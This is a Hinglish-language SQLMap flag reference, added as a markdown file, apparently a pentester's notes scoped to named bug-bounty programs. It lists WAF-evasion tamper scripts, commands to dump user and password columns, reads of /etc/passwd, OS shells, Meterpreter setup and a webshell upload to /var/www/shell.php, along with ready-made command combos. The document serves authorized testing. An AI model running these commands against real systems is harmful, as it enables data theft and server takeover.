@@ -1,0 +1,132 @@
+# SQLMap Complete Flags Reference
+
+## 1. Target Specification
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `-u "URL"` | Target URL specify karta hai (GET parameter ke saath, e.g. `?id=1`) |
+| `-r request.txt` | Burp se saved raw HTTP request file use karta hai — headers, cookies, CSRF token sab preserve hote hain (manual `-u` se zyada reliable) |
+| `-g "google dork"` | Google dork results ko target list banata hai (mass testing ke liye) |
+| `-m urls.txt` | Multiple URLs ek file se bulk test karta hai |
+| `--data="id=1&name=test"` | POST data manually specify karta hai (agar `-r` use nahi kar rahe) |
+| `--cookie="PHPSESSID=abc"` | Session cookie manually pass karta hai |
+| `--host="target.com"` | Specific Host header set karta hai |
+| `--referer="url"` | Referer header spoof karta hai (kabhi referer-based filtering bypass ke liye) |
+| `--headers="X-Forwarded-For: 127.0.0.1"` | Custom headers add karta hai |
+| `--random-agent` | Har request pe random User-Agent use karta hai (basic WAF/fingerprint evasion) |
+| `--proxy="http://127.0.0.1:8080"` | Traffic ko Burp Suite se route karta hai — sabse useful flag manual analysis ke liye |
+
+## 2. Detection Control
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--level=1-5` | Kitne deeply test karna hai. Level 1 = sirf GET/POST params. Level 3+ = cookies bhi. Level 5 = headers, Referer, User-Agent sab test karta hai (slow but thorough) |
+| `--risk=1-3` | Kitne aggressive payloads chalane hain. Risk 1 = safe. Risk 3 = heavy queries jo production data corrupt kar sakti hain — production pe risk=3 avoid karo |
+| `--technique=BEUSTQ` | Kaunsi injection technique try karni hai: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline query. Specific technique force karne ke liye useful (e.g. sirf time-based: `--technique=T`) |
+| `--dbms="MySQL"` | Backend DBMS pehle se specify karo agar pata hai — detection fast ho jata hai |
+| `--os="Linux"` | Backend OS specify karta hai (os-shell ke liye helpful) |
+| `-p "id,name"` | Sirf specific parameters test karta hai (baaki skip) |
+| `--skip="token"` | Kisi parameter ko test karne se skip karta hai (e.g. CSRF token) |
+| `--dbms-cred="user:pass"` | Agar DB credentials already pata hain to directly use karta hai |
+
+## 3. WAF / Filter Bypass (Tamper Scripts)
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--tamper=space2comment` | Spaces ko `/**/` se replace karta hai (space-filtering WAF bypass) |
+| `--tamper=charencode` | Payload characters ko URL-encode karta hai |
+| `--tamper=randomcase` | Keywords ka random CASE karta hai (`SeLeCt`) — case-sensitive filters bypass |
+| `--tamper=between` | `>` aur `<` operators ko `BETWEEN` se replace karta hai |
+| `--tamper=equaltolike` | `=` ko `LIKE` se replace karta hai |
+| `--tamper=apostrophemask` | Single quote (`'`) ko UTF-8 fullwidth char se replace karta hai |
+| `--tamper=base64encode` | Payload ko base64 encode karta hai |
+| `--identify-waf` | Target pe WAF/IPS detect karta hai (kaunsa WAF hai batata hai) |
+| `--check-waf` | WAF/IPS presence properly verify karta hai |
+| `--random-agent` + `--tamper` combo | Multiple evasion layers ek saath (Cloudflare jaise WAF ke against zyada effective) |
+| `--delay=2` | Har request ke beech delay (seconds) — rate-limiting WAF bypass ke liye |
+| `--timeout=30` | Request timeout badhata hai slow WAFs ke liye |
+| `--retries=3` | Failed request retry count |
+
+## 4. Enumeration (Database Info Nikalna)
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--dbs` | Saare available databases list karta hai |
+| `--current-db` | Current active database naam batata hai |
+| `--current-user` | Current DB user batata hai |
+| `--is-dba` | Check karta hai current user DBA (admin) hai ya nahi |
+| `-D dbname --tables` | Specific database ke saare tables list karta hai |
+| `-D dbname -T tablename --columns` | Specific table ke columns list karta hai |
+| `-D dbname -T tablename -C col1,col2 --dump` | Specific columns ka data extract (dump) karta hai |
+| `-D dbname -T tablename --dump` | Poore table ka data dump karta hai |
+| `--dump-all` | Saari databases ka saara data dump karta hai (bahut heavy, careful use) |
+| `--exclude-sysdbs` | System databases (mysql, information_schema) ko dump se exclude karta hai |
+| `--search -C password` | Column names mein "password" jaisa keyword search karta hai across DB |
+| `--count` | Table mein rows ki count batata hai (dump se pehle andaza lagane ke liye) |
+| `--schema` | Poora DB schema structure dump karta hai |
+| `--passwords` | DB user password hashes dump karta hai |
+| `--privileges` | User privileges dikhata hai |
+| `--roles` | DB user roles list karta hai (DBMS support karta hai to) |
+
+## 5. Exploitation (Beyond Data Extraction)
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--os-shell` | Agar DB stacked queries + high privileges support kare, to OS-level command shell milta hai |
+| `--os-cmd="whoami"` | Single OS command directly execute karta hai |
+| `--os-pwn` | Meterpreter/VNC shell setup karta hai (Metasploit integration) |
+| `--sql-shell` | Interactive SQL query shell deta hai |
+| `--sql-query="SELECT ..."` | Ek custom SQL query directly run karta hai |
+| `--file-read="/etc/passwd"` | Server se file read karta hai (agar FILE privilege ho) |
+| `--file-write="local.php" --file-dest="/var/www/shell.php"` | Local file ko server pe upload karta hai (webshell drop karne ke liye — sirf authorized pentest mein) |
+| `--reg-read` | Windows registry read karta hai (Windows DB server pe) |
+
+## 6. Performance & Behavior
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--batch` | Saare prompts pe default answer accept karta hai (non-interactive mode — automation/scripts ke liye zaroori) |
+| `--threads=5` | Parallel requests ki number badhata hai (default 1, max 10 — speed up karta hai) |
+| `--flush-session` | Purani cached session data clear karta hai (fresh test ke liye) |
+| `--fresh-queries` | Pehle se cached results ignore karke naya test karta hai |
+| `-o` | Sabhi optimization flags enable karta hai (`--predict-output`, `--keep-alive`, etc.) |
+| `--eta` | Estimated time remaining dikhata hai |
+| `-v 0-6` | Verbosity level (0=silent, 6=full debug output) |
+| `--output-dir="path"` | Results kaha save karne hain specify karta hai |
+
+## 7. Injection Point Fine-tuning
+
+| Flag | Kya karta hai |
+|------|----------------|
+| `--prefix="') "` | Payload se pehle custom string inject karta hai (jab query structure complex ho) |
+| `--suffix="-- -"` | Payload ke baad custom string add karta hai (comment out karne ke liye) |
+| `--suffix` common values | `-- -`, `#`, `/*` — baaki query ko comment karne ke liye |
+| `--second-order="url"` | Second-order SQLi test karta hai (jahan payload ek jagah save hota hai aur dusri jagah execute) |
+| `--union-cols=1-10` | UNION-based attack ke liye column range specify karta hai |
+| `--union-char="NULL"` | UNION query mein NULL ki jagah custom character use karta hai |
+| `--not-string="notfound"` | False condition detect karne ke liye custom string |
+
+## 8. Common Combos Jo Tum Use Karoge
+
+```bash
+# Burp se capture kiya request test karna
+sqlmap -r request.txt --batch --level=3 --risk=2
+
+# WAF ke against (Cloudflare jaisa)
+sqlmap -r request.txt --tamper=space2comment,randomcase --random-agent --delay=1
+
+# Full DB enumeration
+sqlmap -r request.txt -D dbname --tables
+sqlmap -r request.txt -D dbname -T users --columns
+sqlmap -r request.txt -D dbname -T users -C username,password --dump
+
+# Quick WAF check pehle
+sqlmap -r request.txt --identify-waf --batch
+
+# Time-based blind sirf (jab error-based fail ho raha ho)
+sqlmap -r request.txt --technique=T --batch
+```
+
+## Important Note
+
+Ye flags **sirf authorized targets** (Syfe UAT, Banco Plata, Hilton, Coupang scope ke andar) pe use karna — especially `--risk=3`, `--os-shell`, `--file-write` jaise destructive/high-impact flags ko production environments pe avoid karna, UAT/staging mein bhi client se confirm karke hi heavy flags chalana.
